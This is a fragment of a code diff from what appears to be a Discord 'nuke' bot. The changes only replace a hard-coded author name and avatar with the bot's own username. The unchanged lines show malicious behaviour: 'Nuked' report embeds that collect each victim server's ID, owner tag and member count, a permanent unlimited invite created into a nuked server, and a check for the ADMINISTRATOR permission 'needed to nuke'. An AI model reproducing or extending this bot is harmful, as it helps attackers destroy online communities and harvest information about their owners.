@@ -538,7 +538,7 @@ if(list.includes(msg.author.id)) {return}
 const nukeEmbed = new Discord.MessageEmbed()
 .setColor('#FF0435')
 .setTitle(`Nuked "${msg.guild.name}"`)
-.setAuthor(client.user.username, "https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png")
+.setAuthor(client.user.username, pfp)
 .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")      
 p.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
 .then(invite => {
@@ -645,7 +645,7 @@ client.on("guildCreate", msg => {
     const joinEmbed = new Discord.MessageEmbed()
 .setColor('#FF0435')
 .setTitle(`Joined "${msg.channels.guild.name}"`)
-.setAuthor('The GrimmChild', 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
+.setAuthor(client.user.username, pfp)
 .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`, "_ _")
 .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")
 
@@ -653,7 +653,7 @@ client.on("guildCreate", msg => {
 const joinEmbed2 = new Discord.MessageEmbed()
 .setColor('#FF0435')
 .setTitle(`Joined "${msg.channels.guild.name}"`)
-.setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
+.setAuthor(client.user.username, pfp)
 .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")
 .setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
 
